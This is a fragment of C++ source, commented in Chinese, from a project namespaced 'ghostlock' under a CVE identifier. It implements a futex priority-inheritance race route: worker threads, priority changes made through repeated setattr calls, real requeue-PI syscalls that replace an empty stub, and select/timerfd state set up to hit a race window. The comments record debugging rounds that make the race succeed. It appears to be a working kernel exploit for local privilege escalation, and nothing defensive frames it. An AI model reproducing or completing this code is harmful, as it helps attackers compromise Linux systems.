            std::printf("main: waiter trigger done ✓");
            (void) Ops::unlock_pi(self->chain_word_);
            self->waiter_done_.store(1);
            return nullptr;
        }

        /** consumer 线程：窗口内做 setattr（被拒 ⇒ FUTEX_LOCK_PI 兜底 ✓）。 */
        static void *consumer_entry(void *raw) noexcept {
            auto *args = static_cast<ActorArgs *>(raw);
            SelectStackRoute *self = args->self;
            while (self->consumer_stop_.load() == 0) {
                if (args->waiter_tid == 0) {
                    Ops::yield();
                    continue;
                }
                const std::int32_t nice =
                        (self->nice_step_ % ((self->config_.nice_modulus > 0) ? self->config_.nice_modulus : 1)) + 1;
                ++self->nice_step_;
                const std::int32_t set_ret = Ops::setattr(args->waiter_tid, nice, 0);
                /* 首次结果与总次数都留下（round 196 ✓）：只存"最后一次"会漏掉"首次是否成功" ✗。 */
                const std::int32_t seen = self->setattr_seen_.fetch_add(1);
                if (seen == 0) {
                    self->consumer_setattr_.store(set_ret);
                    self->consumer_setattr_errno_.store(Ops::last_errno());
                }
                self->setattr_calls_.fetch_add(1);
                if (set_ret != 0) {
                    /* 兜底：自己取一次 target 锁再放掉 ✓（与 multicast 的 consumer 同形 ✓）。 */
                    if (Ops::lock_pi(self->target_word_) == 0) {
                        (void) Ops::unlock_pi(self->target_word_);
                    }
                }
                Ops::sleep_micros(50);
            }
            return nullptr;
        }

        /** 一轮窗口里的两枚演员：起、跑、停、join ✓（生命周期限定在窗口内 ✓）。 */
        [[nodiscard]] bool run_actors(fd_set &in_set, fd_set &out_set, fd_set &ex_set) noexcept {
            ActorArgs args{};
            args.self = this;
            args.in_set = &in_set;
            args.out_set = &out_set;
            args.ex_set = &ex_set;
            waiter_ready_.store(0);
            waiter_done_.store(0);
            actors_go_.store(0);
            consumer_stop_.store(0);
            pthread_t waiter{};
            pthread_t consumer{};
            waiter_thread_ = waiter;
            consumer_thread_ = consumer;
            if (::pthread_create(&waiter, nullptr, &SelectStackRoute::waiter_entry, &args) != 0) {
                return false;
            }
            std::printf("main: actors waiter-created");
            if (::pthread_create(&consumer, nullptr, &SelectStackRoute::consumer_entry, &args) != 0) {
                consumer_stop_.store(1);
                (void) ::pthread_join(waiter, nullptr);
                return false;
            }
            /* 等 waiter 把 chain 拿在手上 ✓（否则它的 park 不在链上 ✓），再放它进窗口 ✓。 */
            while (waiter_ready_.load() == 0) {
                Ops::yield();
            }
            std::printf("main: actors ready-wait done");
            actors_go_.store(1);
            std::printf("main: actors go-set");
            Ops::sleep_micros(1000);   /* 沉降（有界 ✓） */
            std::printf("main: actors settle done");
            waiter_thread_ = waiter;
            consumer_thread_ = consumer;
            return true;
        }

        /** 停两枚演员并 join ✓（成功/失败/早退都走这里 ✓）。 */
        void stop_actors(pthread_t waiter, pthread_t consumer) noexcept {
            consumer_stop_.store(1);
            (void) ::pthread_join(consumer, nullptr);
            /* **有界**等待（round 188 ✓）：此前是无限自旋 ✗ ⇒ 真机卡住 180 s ✓。
             *  迭代上限后**不再 join**（`pthread_join` 无超时 ✗）⇒ 改为 detach ✓：
             *  线程会在进程退出时随进程消失 ✓（它只碰本对象的词，不再访问 ⇒ 安全 ✓）。 */
            constexpr std::int32_t kMaxWaitSpins = 400000;
            std::int32_t spins = 0;
            while (waiter_done_.load() == 0 && spins < kMaxWaitSpins) {
                Ops::yield();
                ++spins;
            }
            if (waiter_done_.load() != 0) {
                (void) ::pthread_join(waiter, nullptr);
            } else {
                (void) ::pthread_detach(waiter);
                report_.status_step = 90;   /* 相位号 90 = "等待者未归、已 detach" ✓（可观测 ✓） */
            }
        }

        SelectStackConfig config_{};
        SelectStackReport report_{};
        SelectStackFdPlan plan_{};
        /* ---- 两枚演员的共享状态（都限定在一轮窗口内 ✓） ---- */
        std::uint32_t *wait_word_ = nullptr;
        std::uint32_t *chain_word_ = nullptr;
        std::uint32_t *target_word_ = nullptr;
        std::atomic<std::int32_t> waiter_lock_{0};
        std::atomic<std::int32_t> waiter_park_{0};
        std::atomic<std::int32_t> waiter_park_errno_{0};
        std::atomic<std::int32_t> consumer_setattr_{0};
        std::atomic<std::int32_t> consumer_setattr_errno_{0};
        std::atomic<std::int32_t> setattr_seen_{0};
        std::atomic<std::int32_t> setattr_calls_{0};
        std::atomic<std::int32_t> waiter_ready_{0};
        std::atomic<std::int32_t> waiter_done_{0};
        std::atomic<std::int32_t> actors_go_{0};
        std::atomic<std::int32_t> consumer_stop_{0};
        std::int32_t nice_step_ = 0;
        /** 等待者的 park 时长（round 196 ✓）：200 ms 太短 ✗ ⇒ 消费者还没动手它就退出 ⇒ `ESRCH` ✓。
         *  快照用"永不就绪的 timerfd"让它一直等 ✓ ⇒ 这里取 2 s ✓（仍有界，防挂 ✓）。 */
        std::int64_t actor_wait_us_ = 2000000;
        pthread_t waiter_thread_{};
        pthread_t consumer_thread_{};
        race::WindowGuard guard_{};      /* 窗口守卫（可重复 enter ✓） */
        /** 真 futex seam（round 203 ✓，**关键** ✓）：`pi_race.hpp` 里默认的 `FutexSeam` 是**空实现** ✗
         *  （四个方法全 `return 0` ✓）⇒ 用它时 `cmp_requeue_pi` 恒 <1 ⇒ 每轮 Refused ⇒ successes=0 ✓。
         *  这里绑定到本 route 的 ops（真 syscall ✓，val2/val3 按快照 = 1/0 ✓）。 */
        struct SelectStackSeam final {
            static std::int32_t lock_pi(std::uint32_t *word) noexcept { return Ops::lock_pi(word); }
            static std::int32_t unlock_pi(std::uint32_t *word) noexcept { return Ops::unlock_pi(word); }
            static std::int32_t cmp_requeue_pi(std::uint32_t *chain, std::uint32_t *target) noexcept {
                return Ops::cmp_requeue_pi(chain, target);
            }
            static std::int32_t wait_requeue_pi(std::uint32_t *chain, std::uint32_t *target) noexcept {
                return Ops::wait_requeue_pi_until(chain, target, 2000000);
            }
        };
        race::PiRace<SelectStackSeam> race_{};   /* 引擎绑定**真** seam ✓（此前是空实现 ✗） */
        std::int32_t pipe_read_ = -1;
        std::int32_t pipe_write_ = -1;
        std::int32_t timer_ = -1;
        std::int32_t high_read_ = -1;
        /* 三组 fd_set：prepare 构建一次并保存 ✓（快照 owned_in/out/ex ✓）。 */
        fd_set owned_in_{};
        fd_set owned_out_{};
        fd_set owned_ex_{};
        bool timer_borrows_pipe_ = false;
        std::array<std::int32_t, 64U> backup_{};
        std::size_t backup_count_ = 0U;
        std::array<std::int32_t, 64U> installed_{};
        std::size_t installed_count_ = 0U;
    };

}  // namespace ghostlock::backend::cve_2026_43499::seam
